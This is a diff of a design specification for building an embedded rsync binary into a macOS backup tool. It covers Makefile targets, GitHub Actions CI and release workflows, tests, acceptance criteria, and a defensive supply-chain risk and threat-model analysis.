+	go build $(GOFLAGS) -tags 'release embed_real_rsync' -ldflags "$(LDFLAGS_RELEASE)" -o flashbackup ./cmd/flashbackup
 
 .PHONY: clean-rsync
 clean-rsync:
-	rm -rf ./build
-	rm -f ./internal/rsync/bin/rsync.universal2
+	@rm -rf ./build
+	@rm -f ./internal/rsync/bin/rsync.universal2
+	@echo "removed: ./build/ and ./internal/rsync/bin/rsync.universal2"
 
 .PHONY: test-embed-placeholder
 test-embed-placeholder:
@@ -384,14 +448,19 @@ test-embed-placeholder:
 
 .PHONY: test-embed-real-rsync
 test-embed-real-rsync: build-rsync
-	go test -tags embed_real_rsync ./test/e2e/... -run TestEmbeddedRealRsync
+	go test -tags 'release embed_real_rsync' ./test/e2e/... -run TestEmbeddedRealRsync
 ```
 
-`RELEASE_LDFLAGS` reuses the existing ldflag injection block. Existing `make build` is unchanged.
+Both `-tags 'release embed_real_rsync'` together: the existing `release` tag stays (preserves codesign.IsReleaseBuild=true wire); `embed_real_rsync` selects the universal2 embed. Existing `LDFLAGS_RELEASE` reused unchanged.
 
 ### 5.4 CI plumbing
 
-**Per-commit smoke** (new job in `.github/workflows/ci.yml`):
+Three CI surface changes:
+1. `.github/workflows/ci.yml`: new `build-rsync-smoke` job (matrix).
+2. `.github/workflows/release.yml`: new file.
+3. `.github/workflows/actions-lint.yml`: new file — enforces floating-action-tag detection + rsync.version.attestation freshness.
+
+**Per-commit smoke** (`.github/workflows/ci.yml`, new job):
 
 ```yaml
 build-rsync-smoke:
@@ -404,33 +473,29 @@ build-rsync-smoke:
   permissions:
     contents: read
   steps:
-    - uses: actions/checkout@<PINNED_SHA>   # v4.1.7 commit SHA at task time
+    - uses: actions/checkout@<PINNED_SHA>   # v4.1.7
     - name: Cache rsync tarball
       uses: actions/cache@<PINNED_SHA>
       with:
         path: build/cache
         key: rsync-tarball-${{ hashFiles('scripts/rsync.version') }}
-        restore-keys: rsync-tarball-
+        # NO restore-keys: prefix fallback re-opens cache poisoning per round-2 Hacker N3.
     - name: Smoke-build rsync (single arch)
       run: ./scripts/build-rsync.sh --smoke
     - name: Assert version + linkage + help
       run: |
         ./build/arm64/rsync --version | head -1 | grep -q "version 3.4.1"
-        otool -L ./build/arm64/rsync | grep -E 'libSystem\.B\.dylib' >/dev/null
-        # Assert nothing OTHER than libSystem (excluding the binary name itself)
-        if otool -L ./build/arm64/rsync | tail -n +2 | grep -v 'libSystem\.B\.dylib' | grep -q '\.dylib'; then
+        ./build/arm64/rsync --help >/dev/null
+        # Linkage: assert ONLY libSystem.B.dylib. Anchor on dylib path lines per round-2 QA N4.
+        otool_out="$(otool -L ./build/arm64/rsync)"
+        if echo "$otool_out" | grep -E '^\s+/' | grep -v 'libSystem\.B\.dylib' | grep -q '\.dylib'; then
           echo "FATAL: linkage to non-libSystem dylib detected" >&2
-          otool -L ./build/arm64/rsync >&2
+          echo "$otool_out" >&2
           exit 1
         fi
-        ./build/arm64/rsync --help >/dev/null
 ```
 
-(`<PINNED_SHA>` placeholders are populated at implementation time from the actions' current release SHAs.)
-
-**Cache write policy:** the smoke job runs on every PR + on `main`. To prevent fork-PR cache-write attacks, `actions/cache@<PINNED_SHA>` writes are scoped to `main` only via `if: github.ref == 'refs/heads/main'` on the cache step's write side. (GitHub's cache action has built-in protection that PRs from forks can read but not write; documenting here for explicit posture.)
-
-**New CI release workflow at `.github/workflows/release.yml`:**
+**Release workflow** (`.github/workflows/release.yml`, new file):
 
 ```yaml
 name: Release
@@ -447,8 +512,8 @@ permissions:
 jobs:
   release:
     runs-on: macos-14
-    timeout-minutes: 30
-    environment: production   # manual approval gate; configured in repo settings
+    timeout-minutes: 45    # bumped from 30 per round-2 DevOps I7
+    environment: production   # manual approval gate
     steps:
       - uses: actions/checkout@<PINNED_SHA>
       - uses: actions/setup-go@<PINNED_SHA>
@@ -461,8 +526,8 @@ jobs:
           key: rsync-tarball-${{ hashFiles('scripts/rsync.version') }}
       - name: Build rsync universal2
         run: make build-rsync
-      - name: Build flashbackup release binary
-        run: make release
+      - name: Build real-rsync flashbackup binary
+        run: make build-real-rsync
       - name: Task 12b-B real-rsync e2e
         run: make test-embed-real-rsync
       - name: Compute artifact SHA256
@@ -474,91 +539,174 @@ jobs:
       - name: Upload to GitHub Release (DRAFT)
         uses: softprops/action-gh-release@<PINNED_SHA>
         with:
-          draft: true        # MM publishes manually after smoke check
+          draft: true
+          body: |
+            ## v${{ github.ref_name }}
+            SHA256: ${{ env.FLASHBACKUP_SHA256 }}
+            Provenance: see attestation tab.
           files: |
             flashbackup
             flashbackup.sha256
 ```
 
-The `environment: production` setting requires a one-time configuration in repo settings (Settings → Environments → production → Required reviewers). MM is the sole reviewer. This protects against tag-push spoofing because a compromised PAT or contributor pushing `v0.1.1-evil` cannot trigger the workflow without MM clicking approve.
+**OIDC vs environment-approval ordering** (round-2 DevOps I2 confirmation): GitHub issues OIDC tokens per-job, AFTER the `environment: production` approval gate fires. Attestation step therefore runs post-approval against a build that human reviewed. Workflow assumes this ordering; if GitHub changes it, this spec needs revision.
 
-**Dual-publish of SHA256:** the `flashbackup.sha256` file is uploaded as a release asset AND committed to the repo at the release commit (handled in Plan 2's release flow scripts, not 12a; the upload alone is the 12a delivery). Pre-Plan-2 mitigation: include the SHA256 in the GitHub Release notes body itself so it's discoverable on the release page even if the sidecar file is replaced.
+**Anti-regression lint workflow** (`.github/workflows/actions-lint.yml`, new file, round-2 Hacker N6 + CISO I1):
 
-**Plan 2 adds:** codesign + notarize steps between "Build flashbackup release binary" and "Compute artifact SHA256."
+```yaml
+name: Actions lint
+on:
+  push:
+    branches: [main]
+  pull_request:
+
+permissions:
+  contents: read
+
+jobs:
+  lint:
+    runs-on: ubuntu-latest
+    timeout-minutes: 2
+    steps:
+      - uses: actions/checkout@<PINNED_SHA>
+      - name: Detect floating action tags
+        run: |
+          # All third-party action `uses:` lines must be commit SHAs (40 hex chars), not version tags.
+          if grep -rE 'uses: [^@]+@v[0-9]' .github/workflows/; then
+            echo "FATAL: floating-tag action reference detected (use commit SHA)" >&2
+            exit 1
+          fi
+      - name: Enforce rsync.version.attestation freshness
+        run: |
+          if [[ ! -f scripts/rsync.version.attestation ]]; then
+            echo "FATAL: scripts/rsync.version.attestation missing" >&2
+            exit 1
+          fi
+          # Three witness SHAs must all be identical.
+          witness_shas=$(grep -E '^Witness-' scripts/rsync.version.attestation | awk '{print $2}' | sort -u | wc -l | tr -d ' ')
+          if [[ "$witness_shas" != "1" ]]; then
+            echo "FATAL: rsync.version.attestation witnesses disagree (unique SHA count: $witness_shas)" >&2
+            exit 1
+          fi
+          # Attestation must be within 90 days of rsync.version's last edit.
+          ver_mtime=$(git log -1 --format=%ct -- scripts/rsync.version)
+          att_mtime=$(git log -1 --format=%ct -- scripts/rsync.version.attestation)
+          if (( att_mtime + 7776000 < ver_mtime )); then
+            echo "FATAL: rsync.version.attestation is older than 90 days before rsync.version edit" >&2
+            exit 1
+          fi
+```
+
+**Cache write scoping** (round-2 DevOps M7 clarification): `actions/cache@v4` has built-in protection — PRs from forks can read but not write to the cache. The `if: github.ref == 'refs/heads/main'` belt-and-suspenders mentioned in earlier drafts is unnecessary; removed.
+
+**Bootstrap procedure for `upstream-mirror/<version>` GitHub Release:** see `docs/runbooks/rsync-version-bump.md` (Task 12d, §9.1).
+
+**Plan 2 release-pipeline restructure (round-2 Tech Lead Important 1):**
+
+When Plan 2 lands codesign + notarize + staple, the release.yml step order MUST change as follows (NOT just "added between Build and SHA256"):
+
+1. Build rsync universal2
+2. Build real-rsync flashbackup binary
+3. **Codesign flashbackup binary**
+4. **`notarytool submit --wait`**
+5. **`stapler staple flashbackup`** ← stapling mutates the binary
+6. **Task 12b-B against the stapled binary** ← must test what we ship, not pre-staple
+7. Compute SHA256 of the stapled binary
+8. Generate build-provenance attestation against the stapled artifact (subject-path = stapled binary)
+9. Upload draft
+
+The current v3 spec's step order (build → 12b-B → SHA256 → attestation → upload) is correct for 12a (pre-Plan-2). Plan 2 cannot just append codesign steps; it MUST reorder so test/SHA/attestation operate on the stapled artifact. This is documented here so Plan 2's release-workflow rewrite isn't surprised.
 
 ## 6. Test strategy
 
 | Layer | Test | Location | Build mode | Purpose |
 |---|---|---|---|---|
-| Unit | `internal/rsync` package | `internal/rsync/*_test.go` | Default (placeholder) | Existing: extract, SHA256 verify, chmod, chflags. Task 12a audit confirms tmp+rename ordering. |
-| Script (negative) | Tarball SHA mismatch | `scripts/build-rsync.test.sh` (new) | Mutate cached tarball, assert script exits 1 with mismatch message |
-| Script (negative) | Missing prereq | Same | Run with PATH stripped of clang, assert prereq error fires |
-| E2E | Placeholder rejection (12b-A) | `test/e2e/placeholder_rejection_test.go` | Default | Lock placeholder behavior + extract→exec proof |
-| E2E | Real-rsync release (12b-B) | `test/e2e/embedded_real_rsync_test.go` | `-tags embed_real_rsync` | Content equality, xattr/ACL preservation, linkage regression |
-| CI smoke | Per-commit script | GitHub Actions matrix [macos-13/14/15] | --smoke mode | Catch script regressions across supported macOS versions |
-| Release | Full release workflow | GitHub Actions `release.yml` | `-tags embed_real_rsync` | Audited draft release with provenance |
+| Unit | `internal/rsync` package | `internal/rsync/*_test.go` | Default (placeholder) | Existing tests + Task 12a audit confirms tmp+rename + chflags ordering |
+| Script (negative) | Tarball SHA mismatch | `scripts/build-rsync.test.sh` (new) | Mutate cached tarball; assert exit 1 + mismatch message |
+| Script (negative) | Missing prereq | Same | PATH stripped of clang; assert prereq error |
+| Script (negative) | Corrupted cache | Same | Bit-flip cached tarball mid-test; assert re-verify catches loudly (round-2 QA N5) |
+| Script (negative) | Partial-make recovery | Same | `pkill make` mid-build; re-run; assert clean recovery (round-2 QA N5) |
+| E2E | Placeholder rejection (12b-A) | `test/e2e/placeholder_rejection_test.go` | Default | Lock placeholder behavior + extract→exec proof via rsync.log |
+| E2E | Real-rsync release (12b-B) | `test/e2e/embedded_real_rsync_test.go` | `-tags 'release embed_real_rsync'` | External SHA256 content equality + diff -rq tree equality + xattr + ACL preservation + per-arch linkage |
+| CI smoke | Per-commit script | GitHub Actions matrix [macos-13/14/15] | --smoke | Catch script regressions across supported macOS versions |
+| CI actions-lint | Per-commit YAML/attestation | GitHub Actions | n/a | Floating-tag detection + rsync.version.attestation freshness |
+| CI release | Full release workflow | GitHub Actions `release.yml` | `-tags 'release embed_real_rsync'` | Audited draft release with provenance |
 
-12b-A and 12b-B follow existing e2e patterns (no coverage minimum; pass/fail). Script negative tests are smoke-grade — invoke the script in controlled-failure modes and grep stderr for expected error markers.
+**Cross-test sequencing** (round-2 QA N6): each e2e test uses its own `t.TempDir()` for the dest USB and source fixture. Neither references `./build/` directly. 12b-A and 12b-B can run in any order or in parallel.
 
 ## 7. Acceptance criteria
 
 **Task 12a:**
 
-1. **AC-12a-1**: `scripts/build-rsync.sh` produces `internal/rsync/bin/rsync.universal2` from a clean checkout in <5 minutes on M1 Max.
+1. **AC-12a-1**: `scripts/build-rsync.sh` produces `internal/rsync/bin/rsync.universal2` from a clean checkout in <5 minutes on M1 Max. (Wall-clock target; not asserted in CI but documented.)
 2. **AC-12a-2**: `file internal/rsync/bin/rsync.universal2` reports `Mach-O universal binary with 2 architectures: [x86_64] [arm64]`.
-3. **AC-12a-3**: `otool -L internal/rsync/bin/rsync.universal2` reports only `/usr/lib/libSystem.B.dylib`.
-4. **AC-12a-4**: `./internal/rsync/bin/rsync.universal2 --version` reports `rsync  version 3.4.1` on both arm64 and x86_64 Macs.
-5. **AC-12a-5**: `make release` produces a flashbackup binary that, when run against the 12b-B fixture with no env override, completes a backup with exit 0, source-dest content equality, and xattr/ACL preservation.
-6. **AC-12a-6**: `make build` (no tag) still produces a flashbackup binary that embeds the placeholder.
-7. **AC-12a-7**: `make clean-rsync` removes `internal/rsync/bin/rsync.universal2` + `./build/`; subsequent `make build-rsync` succeeds from a clean state.
-8. **AC-12a-8**: `RSYNC_TARBALL_SHA256` in `scripts/rsync.version` matches the value from all three of (Homebrew formula, Linux distro package, rsync-announce mail), as recorded in a comment above the constant.
+3. **AC-12a-3**: `otool -L -arch arm64` and `otool -L -arch x86_64` both report only `/usr/lib/libSystem.B.dylib`.
+4. **AC-12a-4**: `./internal/rsync/bin/rsync.universal2 --version` reports `rsync  version 3.4.1` on both arm64 and x86_64 macOS hosts.
+5. **AC-12a-5**: `make build-real-rsync` produces a flashbackup binary that, against the extended-pathological fixture with no env override, completes a backup with exit 0, externally-verified content equality, xattr preservation, and ACL preservation.
+6. **AC-12a-6**: `make build` (existing, unchanged) still produces a flashbackup binary that embeds the placeholder.
+7. **AC-12a-7**: `make clean-rsync` removes `internal/rsync/bin/rsync.universal2` + `./build/` and echoes what it cleaned; subsequent `make build-rsync` succeeds from a clean state.
+8. **AC-12a-8**: `scripts/rsync.version.attestation` records the SHA256 from all three Samba-ecosystem witnesses; CI `actions-lint` workflow enforces freshness (within 90 days of rsync.version edit) and witness agreement.
+9. **AC-12a-9**: `scripts/build-rsync.sh` parses `rsync.version` via grep regex, NOT Bash source (verifiable by `grep -c '^source\|^\. ' scripts/build-rsync.sh` returning 0).
 
 **Task 12b:**
 
-9. **AC-12b-1**: `test/e2e/placeholder_rejection_test.go` passes under default build, asserts exit 1 + exit status `partial` + 0 bytes transferred + `PLACEHOLDER rsync` marker in `rsync.log`.
-10. **AC-12b-2**: `test/e2e/embedded_real_rsync_test.go` skips cleanly when `bin/rsync.universal2` is absent; when present, asserts exit 0 + bytes>0 + recursive content equality + tree equality + xattr/ACL preservation + linkage regression.
-11. **AC-12b-3 (xattrs/ACLs end-to-end)**: 12b-B fixture includes files with `user.flashbackup-test` xattr and a per-user ACL entry; assertions confirm both survive on dest.
-12. **AC-12b-4 (script negative tests)**: tarball-mismatch and missing-prereq script tests exit 1 with expected error markers; pass in CI.
+10. **AC-12b-1**: `placeholder_rejection_test.go` passes under default build; asserts exit 1 + exit status `partial` + 0 bytes + `PLACEHOLDER rsync` marker in rsync.log.
+11. **AC-12b-2 (externally-verified content equality)**: `embedded_real_rsync_test.go` asserts source SHA256 (via `internal/hash.StreamSHA256`) equals dest SHA256 (via `exec.Command("/usr/bin/shasum", "-a", "256", destPath)`) for every fixture file. The dest hash MUST come from an external subprocess, not from any function in the flashbackup binary.
+12. **AC-12b-3 (xattr/ACL end-to-end)**: extended-pathological fixture includes files (g) and (h); 12b-B asserts xattr `user.flashbackup-test` survives on dest, ACL entry for the gen-time-recorded user survives on dest (compared by content semantics, not hardcoded string).
+13. **AC-12b-4 (script negative tests)**: all four negative scenarios (tarball mismatch, missing prereq, corrupted cache, partial-make) exit 1 with expected error markers; pass in CI.
 
 **CI plumbing:**
 
-13. **AC-CI-1**: `build-rsync-smoke` runs on every commit to `main` AND every PR, across macOS 13/14/15 matrix, completes in <90 seconds per matrix cell, asserts: version starts with `rsync  version 3.4.1`, linkage limited to libSystem.B.dylib, `--help` exits 0.
-14. **AC-CI-2**: `release.yml` runs on tag push with `environment: production` manual approval; executes 12b-B; generates build-provenance attestation; uploads as DRAFT to GitHub Releases. Fails the workflow if 12b-B fails or attestation generation fails.
-15. **AC-CI-3**: All third-party GitHub Actions in both workflows pinned to commit SHA (not floating tag); all jobs declare least-privilege `permissions:` block.
+14. **AC-CI-1**: `build-rsync-smoke` runs on every commit to `main` AND every PR, across macOS 13/14/15 matrix, completes in <90 s per cell; asserts version starts with `rsync  version 3.4.1`, linkage limited to libSystem (anchored regex), `--help` exits 0.
+15. **AC-CI-2**: `release.yml` runs on tag push with `environment: production` manual approval; executes 12b-B; generates build-provenance attestation; uploads as DRAFT to GitHub Releases. Fails on 12b-B failure or attestation failure.
+16. **AC-CI-3**: `actions-lint.yml` enforces all third-party actions pinned to commit SHA (no floating tag) AND `scripts/rsync.version.attestation` freshness + witness agreement.
 
 ## 8. Risks and mitigations
 
 | Risk | Likelihood | Impact | Mitigation |
 |---|---|---|---|
-| rsync 3.4.1 build quirk on macOS 13/14/15/16 | Low | Medium | CI smoke matrix catches per-commit across all supported versions; rsync 3.4.x is stable upstream |
-| samba.org tarball SHA256 changes (re-release without version bump) | Very low | High | Triple-source SHA verification at populate time + GitHub mirror as primary download decouples us from samba.org availability |
-| Apple deprecates `lipo` or universal2 binaries | Very low | High | macOS 13-16 all support universal2; revisit if Apple changes course |
-| Embedded rsync extracted on USB triggers Gatekeeper quarantine | Medium | Low | tmp+rename via filesystem APIs; macOS does not quarantine files written from a vouched parent; Plan 2 notarization fully resolves |
-| `--disable-xxhash` removes a feature flashbackup uses | Very low | High | AC-12b-3 verifies --xattrs and --acls survive end-to-end; pre-implementation grep of `internal/rsync/wrapper.go` confirms no rsync flag touches xxhash |
-| GitHub Actions cache poisoning via fork PR | Low | Medium | Cache writes scoped to `main` only; reads from cache require SHA-pinned tarball to match the pinned constant; mismatched cache entry causes script failure (loud, not silent) |
-| Tag-push spoofing by compromised PAT | Low | Critical | `environment: production` manual approval gate on release.yml; MM is sole reviewer; spoofed tag triggers workflow but binary never publishes without MM's click |
-| Third-party action pointing-tag re-pointed maliciously | Low | High | All actions pinned to commit SHA |
-| Build host shell-access injection | Low | Medium | PATH reset to /usr/bin:/bin in build_arch; configure runs from a freshly cleaned dir; tmp+rename audit covers extraction |
-| User downloads phished "FlashBackup v0.x" from a malicious source | Medium | High | Build provenance attestation + dual-publish SHA256 (release sidecar + repo commit + release notes body) — defense in depth without GPG ceremony at this stage; revisit if Phase 1 dogfood shows friends Google-searching for FlashBackup |
+| rsync 3.4.1 build quirk on macOS 13/14/15/16 | Low | Medium | Smoke matrix catches per-commit; rsync 3.4.x is stable upstream |
+| samba.org tarball SHA256 changes (pre-pin) | Very low | High | Triple-witness Samba-ecosystem cross-check at populate time; attestation file commits the result. **Limit:** all three witnesses ultimately derive from samba.org; pre-pin samba.org compromise is not defended |
+| samba.org outage at release time | Medium | Medium | GitHub mirror as primary download channel; samba.org fallback. Bootstrap procedure for first-release-per-version |
+| Apple deprecates `lipo` or universal2 | Very low | High | macOS 13-16 all support universal2; revisit if Apple changes |
+| Embedded rsync extracted on USB triggers Gatekeeper quarantine | Medium | Low | tmp+rename via filesystem APIs from vouched parent process; Plan 2 notarization fully resolves |
+| `--disable-xxhash` removes a feature flashbackup uses | Very low | High | AC-12b-3 verifies --xattrs/--acls end-to-end; pre-implementation grep of `internal/rsync/wrapper.go` confirms no flag touches xxhash |
+| Cache poisoning via fork PR | Low | Medium | `actions/cache` built-in fork-write protection; `restore-keys` prefix fallback dropped per round-2 Hacker N3; SHA-verify catches mismatched cache loudly |
+| Tag-push spoofing by compromised contributor PAT | Low | Critical | `environment: production` manual approval gate. **Limit:** if MM's own GitHub credentials are compromised, attacker tags AND approves as MM — gate provides ZERO protection. Full mitigation requires hardware-key 2FA on MM account. Documented for honesty per round-2 CISO I2 + Hacker C1-verdict |
+| Third-party action pointing-tag re-pointed maliciously | Low | High | All actions pinned to commit SHA; `actions-lint.yml` enforces no-floating-tag on every commit |
+| Build-host shell-access injection | Low | Medium | PATH hygiene at script entry (not per-function); configure runs from freshly cleaned dir; tmp+rename audit covers extraction |
+| Bash source of rsync.version → arbitrary code execution at build time | n/a (designed out) | Critical-if-introduced | Spec mandates parse-don't-source via grep regex; AC-12a-9 enforces no `source`/`.` of rsync.version in the script |
+| GitHub OIDC issuer / runner compromise | Very low | Critical | Provenance attestation depends on GitHub OIDC + macos-14 runner integrity. **Limit:** an attacker who pwns either layer can mint Sigstore certs for malicious binaries. Defense in depth would require independent signing (Plan 2 GPG) |
+| Phishing of friend with malicious "FlashBackup" binary | Medium | High | Provenance attestation + dual-publish SHA256 (release sidecar + release notes body); README directs to canonical URL. See §8.2 |
 
 ### 8.1 Local vs CI determinism
 
-`make release` run locally on MM's Mac will NOT produce a byte-identical binary to the CI release workflow. The Go ldflag injection bakes in build epoch + commit SHA + builder host; these differ. **CI binary is authoritative.** Local `make release` is for MM's iterative testing only. AC-12a-5 specifies behavior, not byte-equality.
+`make build-real-rsync` run locally on MM's Mac will NOT produce a byte-identical binary to the CI release workflow — Go ldflag injection embeds build epoch + commit SHA + builder host. **CI binary is authoritative.** Local `make build-real-rsync` is for MM's iterative testing only. AC-12a-5 specifies behavior, not byte-equality.
 
 Reproducible-build deep-dive (SOURCE_DATE_EPOCH, trimpath, byte-identical attestation across builders) is queued for Plan 2+.
 
-### 8.2 USB-spread threat model
+### 8.2 USB-spread threat model — what attestation actually proves
 
-The "20 friends, not nation-state" framing assumes MM personally distributes flashbackup binaries to each friend. The escalation case is a friend Googling for "FlashBackup" and landing on a phishing page hosting a malicious binary. Defenses at this stage:
-- Build provenance attestation gives the canonical artifact a verifiable origin (GitHub-signed Sigstore certificate via actions/attest-build-provenance).
-- SHA256 dual-publish: release sidecar + repo commit + release notes body. A friend (or MM) can compare any two to detect substitution.
-- README explicitly tells friends "the only canonical download is github.com/maheshmirchandani/Backup-Pro/releases. SHA256 in release notes; verify via `shasum -a 256 ./flashbackup` before running."
+The "20 friends, not nation-state" framing assumes MM personally distributes flashbackup to each friend. The escalation case is a friend Googling for "FlashBackup" and landing on a phishing page hosting a malicious binary.
 
-If Phase 1 dogfood reveals friends not following the README protocol or losing the GitHub-URL provenance, escalate to GPG signing of release artifacts in Plan 2. Don't add it pre-emptively; the operational cost of GPG keychain management is real for a single-maintainer project.
+**What `actions/attest-build-provenance` proves to a verifier:** the artifact was built by GitHub Actions on flashbackup's `main` branch at the specified commit using the specified runner image. Verifiable via `cosign verify-blob` against Sigstore.
 
-### 8.3 Reproducibility asymmetry
+**What attestation does NOT prove:**
+- Reproducibility: a verifier cannot rebuild the binary locally and confirm byte-equality (Section 8.1).
+- Builder integrity: a compromised GitHub OIDC issuer or runner image could mint real-looking attestations for malicious binaries.
+- Source code equivalence: attestation proves "this artifact came from THIS GitHub Actions run," not "the source you can inspect on GitHub is the source that was built." A maliciously-pushed commit to `main` followed by an immediate revert would still get attested.
 
-See 8.1. Documented, not chased in 12a.
+These limits are honestly captured because the round-2 Tech Lead surfaced that "audit-clean" in Section 2 goal 5 had overclaimed. The full chain (reproducibility + GPG-signed source) is multi-week work properly belonging to Plan 2.
+
+**Pre-escalation defenses (sufficient for current cohort):**
+- SHA256 dual-publish (release sidecar + release notes body + repo commit).
+- README directs to single canonical URL: github.com/maheshmirchandani/Backup-Pro/releases.
+- Attestation present and verifiable.
+
+**Escalation trigger to GPG signing in Plan 2 (round-2 Tech Lead Important 4 clarification):** any of the following observed in Phase 1 dogfood:
+- A friend reports downloading FlashBackup from a non-github.com URL.
+- A Sev1 report includes a binary whose SHA256 does not match any published Release.
+- Phase 1 expands to >5 friends.
 
 ## 9. Out of scope (deferred)
 
@@ -566,35 +714,61 @@ Items intentionally not in this spec:
 
 - Code signing and notarization. Plan 2.
 - Reproducible-build attestation (SLSA Level 3+). Plan 2+.
-- GPG signature verification of upstream rsync. Plan 2 reconsideration; pre-emptive add is unjustified for current threat model.
+- GPG signature verification of upstream rsync. Plan 2, triggered by §8.2 signals.
 - Building rsync versions other than 3.4.1. Future single-file version bump.
-- Adding back disabled features. Triggered only by a flashbackup feature requirement.
+- Adding back disabled features. Triggered by feature requirement.
 - Static-build of openssl/zstd/lz4/xxhash. Same trigger.
 
-### 9.1 Spun off from multi-hat review (track separately)
+### 9.1 Spun off from multi-hat reviews (tracked separately)
 
-Three concerns from the review do not belong in 12a but must not be lost:
+Five concerns from rounds 1 + 2 do not belong in 12a but must not be lost. Each gets a dated tracker:
 
-1. **CVE response posture for embedded rsync.** Project-wide, not 12a-scoped. Queue as a separate doc task post-12a: monitoring channel (rsync-announce mailing list), CVSS threshold for re-cut (≥7.0 in code paths flashbackup invokes: `-a -c --xattrs --acls --inplace --partial --append`), 7-day re-cut SLO, GitHub Release notes "security" tag convention, README "check Releases monthly" user signal. Target landing: between Task 12a completion and Phase 0 gate close.
-2. **Reproducible builds.** Section 8.1. Documented as asymmetry; deep-dive deferred to Plan 2+.
-3. **GPG / USB-spread escalation.** Section 8.2. Documented threat model; escalation trigger is Phase 1 dogfood signal.
+1. **Task 12c — CVE-response posture stub** (round-2 CISO I3 + Tech Lead Important 5).
+   - Deliverable: `SECURITY.md` + rsync-announce mailing list subscription.
+   - Content: monitoring channel, CVSS ≥7.0 threshold in flashbackup-invoked code paths (`-a -c --xattrs --acls --inplace --partial --append`), 7-day re-cut SLO, GitHub Release notes "security" label convention, README "check Releases monthly" user signal.
+   - Target landing: 2026-06-12 (before Phase 0 gate close on 2026-06-19).
+   - If not landed by 2026-06-12: surface to MM as gate-blocker on Phase 0 close.
+
+2. **Task 12d — Release + rollback + version-bump runbooks** (round-2 DevOps I3 + bootstrap procedure).
+   - Deliverable: `docs/runbooks/release-cut.md`, `docs/runbooks/rsync-version-bump.md`, `docs/runbooks/sev1-rollback.md`.
+   - Content: MM-side procedure for tag → CI approve → draft verify → publish; first-release bootstrap of `upstream-mirror/<version>` GitHub Release; Sev1-within-hour rollback (un-publish draft, delete release, yank tag, post-mortem).
+   - Target landing: 2026-06-12 (before Phase 0 gate close).
+
+3. **Reproducible builds.** Section 8.1 + 8.2 document the asymmetry honestly. Deep-dive (SOURCE_DATE_EPOCH, trimpath, multi-builder cross-check) deferred to Plan 2+.
+
+4. **GPG signing of release artifacts.** Section 8.2 documents the escalation triggers. Plan 2.
+
+5. **Genuinely-independent fourth witness** for upstream SHA (round-2 Hacker N4). The Samba-ecosystem dependency is acknowledged in §4.4; adding a fourth witness outside the ecosystem (Gentoo Manifest, Crater, or similar with its own GPG chain) is queued for Plan 2 alongside GPG escalation.
 
 ## 10. Spec self-review log
 
 Initial draft review (2026-06-06 1839):
-- [x] Placeholder scan: only `RSYNC_TARBALL_SHA256` deferred fill (explicit, with triple-source population protocol).
-- [x] Internal consistency: `embed_real_rsync` tag name, file paths, AC numbering consistent.
-- [x] Scope check: 12a + 12b, no spec-development-discipline trigger.
-- [x] Bash correctness: fixed prereq loop, absolute paths, IFS, PATH hygiene.
-- [x] `--smoke` mode body added.
+- [x] Placeholder scan + internal consistency + Bash correctness + smoke mode.
 
-Multi-hat review (2026-06-06 1900-1930):
-- [x] CISO findings folded: triple-source SHA verification (4.4), GitHub mirror as primary (4.4), build provenance attestation (4.6, 5.4), CVE posture spun off (9.1), USB threat model documented (8.2), reproducibility asymmetry documented (8.1).
-- [x] Hacker findings folded: action SHA pinning (4.6, 5.4), `environment: production` manual approval (5.4), cache write scoping (5.4 + Risks table), build_arch PATH reset (5.1), tmp+rename audit (5.2), placeholder marker assertion (4.5), triple-source SHA (4.4). Hacker Minor 7 (network sandbox for placeholder test) skipped as over-engineering for current scope.
-- [x] DevOps/SRE findings folded: `permissions:` blocks (4.6, 5.4), `draft: true` + manual gate (5.4), cache key on `scripts/rsync.version` only (4.4), GitHub mirror primary (4.4), idempotency contract (5.1), `make clean-rsync` (5.3), `.gitignore /build/` (4.2), provenance attestation (5.4), timeout-minutes (5.4), local-vs-CI determinism (8.1), `setup-go` go-version pin (5.4).
-- [x] QA findings folded: 12b-B content equality + tree equality (4.5), xattr/ACL test (4.5, AC-12b-3), placeholder marker (4.5, AC-12b-1), script negative tests (6, AC-12b-4), macOS matrix on smoke (5.4, AC-CI-1), 12b-B fixture lock (4.5), CI smoke broader assertions (5.4, AC-CI-1). QA Minor 9 (test naming AC traceability) skipped as project-wide convention change with low signal.
-- [x] Senior Dev/DX findings folded: var declaration commit (5.2), clean-rsync target (5.3), idempotency contract (5.1), failure-preserves-artifacts (5.1), `.gitignore /build/` (4.2), IFS (5.1), error-message install hints (5.1), failure trap (5.1), `curl --progress-bar` (5.1).
-- [x] DevOps Minor 9 (macos-14 EOL plan): kept in §8 risks, no detailed plan until GitHub announces deprecation.
+Round 1 multi-hat review (2026-06-06 1900-1930) — 9 Critical + 20 Important folded.
+
+Round 2 multi-hat review (2026-06-06 2000-2030) — 4 Critical + ~25 Important folded into this v3:
+- [x] Critical 1 (parse-don't-source): §4.4 + §5.1 grep regex implementation + AC-12a-9 enforcement.
+- [x] Critical 2 (independent code path): §4.5 + AC-12b-2 explicitly require `exec.Command("/usr/bin/shasum")` for dest hashes.
+- [x] Critical 3 (make build / -tags release collision): §4.2 preserves existing `make build` unchanged; new target `make build-real-rsync` composes `release embed_real_rsync` tags.
+- [x] Critical 4 (layout drift): §11 nod to invariant #45 + §5.4 Plan 2 directory reservation noted.
+- [x] Cluster A (threat-model honesty): §8 risk table rows explicitly document single-reviewer-gate limitation, Samba-ecosystem dependency, OIDC/runner trust limit; §4.4 rename to "triple-witness within Samba ecosystem."
+- [x] Cluster B (CI/CD seams): `actions-lint.yml` workflow new; `restore-keys` dropped; bootstrap procedure documented; OIDC ordering documented; release/rollback runbook → Task 12d.
+- [x] Cluster C (Plan 2 handoff seams): §5.4 has explicit Plan 2 restructure block (12b-B after staple, SHA256 of stapled, attestation subject = stapled).
+- [x] Cluster D (CVE posture): Task 12c with 2026-06-12 deadline; §2 goal 5 wording tightened ("auditable at the limits of attestation").
+- [x] Cluster E (fixture reuse): §4.5 extends `pathological/` for items (g) xattr + (h) ACL instead of new `12b-b/` directory.
+- [x] Cluster F (test assertion fragility): §4.5 + AC-12b-2/3 cover xattr in-place write, ACL semantic compare, per-arch `otool`, separate-layer assertions.
+- [x] Cluster G (script ergonomics): conditional trap, dropped `2>/dev/null`, PATH at script entry.
+- [x] Cluster H (reproducibility honesty): §8.2 rewritten with what attestation proves vs not.
+- [x] Cluster I (GPG escalation trigger): §8.2 names three concrete observable signals.
+- [x] Hacker N1 (Bash source RCE): closed by Critical 1.
+- [x] Hacker N3 (restore-keys cache poisoning): dropped from §5.4.
+- [x] Hacker N6 (floating-tag enforcement): actions-lint.yml CI gate.
+- [x] DevOps timeout-minutes: bumped release to 45.
